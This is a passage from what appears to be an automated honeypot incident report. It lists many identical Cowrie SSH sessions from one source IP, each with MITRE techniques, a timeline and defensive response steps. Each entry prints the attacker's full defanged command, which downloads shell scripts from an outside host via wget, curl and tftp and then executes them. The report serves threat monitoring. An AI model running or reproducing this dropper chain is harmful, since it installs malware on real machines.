| `2026-08-25 09:59:11` | `cowrie.log.closed` |
| `2026-08-25 09:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32f61b7cf07

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:11` | `cowrie.session.connect` |
| `2026-08-25 09:59:11` | `cowrie.login.success` |
| `2026-08-25 09:59:11` | `cowrie.session.params` |
| `2026-08-25 09:59:12` | `cowrie.command.input` |
| `2026-08-25 09:59:12` | `cowrie.command.success` |
| `2026-08-25 09:59:12` | `cowrie.log.closed` |
| `2026-08-25 09:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff85ef2a01bf

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:12` | `cowrie.session.connect` |
| `2026-08-25 09:59:12` | `cowrie.login.success` |
| `2026-08-25 09:59:13` | `cowrie.session.params` |
| `2026-08-25 09:59:13` | `cowrie.command.input` |
| `2026-08-25 09:59:13` | `cowrie.command.success` |
| `2026-08-25 09:59:14` | `cowrie.log.closed` |
| `2026-08-25 09:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27584c37c502

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:14` | `cowrie.session.connect` |
| `2026-08-25 09:59:14` | `cowrie.login.success` |
| `2026-08-25 09:59:14` | `cowrie.session.params` |
| `2026-08-25 09:59:15` | `cowrie.command.input` |
| `2026-08-25 09:59:15` | `cowrie.command.success` |
| `2026-08-25 09:59:15` | `cowrie.log.closed` |
| `2026-08-25 09:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eae2824a3d8b

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:15` | `cowrie.session.connect` |
| `2026-08-25 09:59:15` | `cowrie.login.success` |
| `2026-08-25 09:59:16` | `cowrie.session.params` |
| `2026-08-25 09:59:16` | `cowrie.command.input` |
| `2026-08-25 09:59:16` | `cowrie.command.success` |
| `2026-08-25 09:59:17` | `cowrie.log.closed` |
| `2026-08-25 09:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eddb13f02cb1

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:17` | `cowrie.session.connect` |
| `2026-08-25 09:59:17` | `cowrie.login.success` |
| `2026-08-25 09:59:17` | `cowrie.session.params` |
| `2026-08-25 09:59:17` | `cowrie.command.input` |
| `2026-08-25 09:59:17` | `cowrie.command.success` |
| `2026-08-25 09:59:18` | `cowrie.log.closed` |
| `2026-08-25 09:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e04b8318db78

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:18` | `cowrie.session.connect` |
| `2026-08-25 09:59:18` | `cowrie.login.success` |
| `2026-08-25 09:59:19` | `cowrie.session.params` |
| `2026-08-25 09:59:19` | `cowrie.command.input` |
| `2026-08-25 09:59:19` | `cowrie.command.success` |
| `2026-08-25 09:59:19` | `cowrie.log.closed` |
| `2026-08-25 09:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c9547ed48d0

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:19` | `cowrie.session.connect` |
| `2026-08-25 09:59:20` | `cowrie.login.success` |
| `2026-08-25 09:59:20` | `cowrie.session.params` |
| `2026-08-25 09:59:20` | `cowrie.command.input` |
| `2026-08-25 09:59:20` | `cowrie.command.success` |
| `2026-08-25 09:59:21` | `cowrie.log.closed` |
| `2026-08-25 09:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-365a2503eb19

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:21` | `cowrie.session.connect` |
| `2026-08-25 09:59:21` | `cowrie.login.success` |
| `2026-08-25 09:59:22` | `cowrie.session.params` |
| `2026-08-25 09:59:22` | `cowrie.command.input` |
| `2026-08-25 09:59:22` | `cowrie.command.success` |
| `2026-08-25 09:59:22` | `cowrie.log.closed` |
| `2026-08-25 09:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecee93d24eca

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:23` | `cowrie.session.connect` |
| `2026-08-25 09:59:23` | `cowrie.login.success` |
| `2026-08-25 09:59:23` | `cowrie.session.params` |
| `2026-08-25 09:59:23` | `cowrie.command.input` |
| `2026-08-25 09:59:23` | `cowrie.command.success` |
| `2026-08-25 09:59:24` | `cowrie.log.closed` |
| `2026-08-25 09:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce4f289bc1a3

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:24` | `cowrie.session.connect` |
| `2026-08-25 09:59:24` | `cowrie.login.success` |
| `2026-08-25 09:59:25` | `cowrie.session.params` |
| `2026-08-25 09:59:25` | `cowrie.command.input` |
| `2026-08-25 09:59:25` | `cowrie.command.success` |
| `2026-08-25 09:59:26` | `cowrie.log.closed` |
| `2026-08-25 09:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-868b9933a533

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:26` | `cowrie.session.connect` |
| `2026-08-25 09:59:26` | `cowrie.login.success` |
| `2026-08-25 09:59:26` | `cowrie.session.params` |
| `2026-08-25 09:59:26` | `cowrie.command.input` |
| `2026-08-25 09:59:26` | `cowrie.command.success` |
| `2026-08-25 09:59:27` | `cowrie.log.closed` |
| `2026-08-25 09:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cbc9a3f73f9

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:27` | `cowrie.session.connect` |
| `2026-08-25 09:59:27` | `cowrie.login.success` |
| `2026-08-25 09:59:28` | `cowrie.session.params` |
| `2026-08-25 09:59:28` | `cowrie.command.input` |
| `2026-08-25 09:59:28` | `cowrie.command.success` |
| `2026-08-25 09:59:28` | `cowrie.log.closed` |
| `2026-08-25 09:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f947434fa1

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:29` | `cowrie.session.connect` |
| `2026-08-25 09:59:29` | `cowrie.login.success` |
| `2026-08-25 09:59:29` | `cowrie.session.params` |
| `2026-08-25 09:59:29` | `cowrie.command.input` |
| `2026-08-25 09:59:29` | `cowrie.command.success` |
| `2026-08-25 09:59:30` | `cowrie.log.closed` |
| `2026-08-25 09:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-310c41911c95

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:30` | `cowrie.session.connect` |
| `2026-08-25 09:59:30` | `cowrie.login.success` |
| `2026-08-25 09:59:31` | `cowrie.session.params` |
| `2026-08-25 09:59:31` | `cowrie.command.input` |
| `2026-08-25 09:59:31` | `cowrie.command.success` |
| `2026-08-25 09:59:31` | `cowrie.log.closed` |
| `2026-08-25 09:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa42abaa660e

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:31` | `cowrie.session.connect` |
| `2026-08-25 09:59:32` | `cowrie.login.success` |
| `2026-08-25 09:59:32` | `cowrie.session.params` |
| `2026-08-25 09:59:32` | `cowrie.command.input` |
| `2026-08-25 09:59:32` | `cowrie.command.success` |
| `2026-08-25 09:59:33` | `cowrie.log.closed` |
| `2026-08-25 09:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0122ae7fe9c5

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:33` | `cowrie.session.connect` |
| `2026-08-25 09:59:33` | `cowrie.login.success` |
| `2026-08-25 09:59:34` | `cowrie.session.params` |
| `2026-08-25 09:59:34` | `cowrie.command.input` |
| `2026-08-25 09:59:34` | `cowrie.command.success` |
| `2026-08-25 09:59:34` | `cowrie.log.closed` |
| `2026-08-25 09:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2a8b266525

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:34` | `cowrie.session.connect` |
| `2026-08-25 09:59:35` | `cowrie.login.success` |
| `2026-08-25 09:59:35` | `cowrie.session.params` |
| `2026-08-25 09:59:35` | `cowrie.command.input` |
| `2026-08-25 09:59:35` | `cowrie.command.success` |
| `2026-08-25 09:59:36` | `cowrie.log.closed` |
| `2026-08-25 09:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c87b4dbbfc5d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
